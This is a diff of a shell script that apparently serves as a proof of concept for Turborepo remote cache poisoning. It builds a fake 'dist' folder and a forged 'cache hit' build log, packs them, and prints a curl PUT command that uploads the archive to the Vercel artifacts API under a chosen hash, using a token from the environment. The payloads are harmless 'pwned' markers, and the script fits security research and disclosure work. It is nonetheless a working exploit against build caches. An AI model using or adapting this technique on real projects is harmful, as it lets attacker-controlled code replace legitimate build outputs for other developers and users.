@@ -11,11 +11,16 @@ TOKEN="$VERCEL_ARTIFACTS_TOKEN"
 HASH="4003f1ca98463840"
 echo $TEAM
 
-mkdir -p packages/web/dist packages/web/.turbo/turbo-build.log
-echo '{"name":"youuu","version":"4.1.0","main":"index.js","scripts":{"build":"echo \"pwned via turbo cache poisoning\""}}' > packages/web/dist/package.json
-echo 'console.log("pwned via turbo cache poisoning")' > packages/web/dist/index.js
 
-tar -cf artifact.tar -C packages/web/dist packages/web/.turbo/turbo-build.log 
+# Create poisoned dist (turbo restores relative to package dir)
+mkdir -p /tmp/poison/dist /tmp/poison/.turbo
+echo '{"name":"youuu","version":"4.1.0","main":"index.js","scripts":{"build":"echo \"pwned via turbo cache poisoning\""}}' > /tmp/poison/dist/package.json
+echo 'console.log("pwned via turbo cache poisoning")' > /tmp/poison/dist/index.js
+echo '<h1>Poisoned by turbo cache PoC</h1>' > /tmp/poison/dist/index.html
+echo "cache hit, replaying output $HASH" > /tmp/poison/.turbo/turbo-build.log
+
+# Pack relative to package dir root (how turbo expects it)
+tar -cf artifact.tar -C /tmp/poison dist/ .turbo/turbo-build.log
 zstd -f artifact.tar
 
 echo "curl -sS -X PUT $API/v8/artifacts/$HASH?teamId=$TEAM"
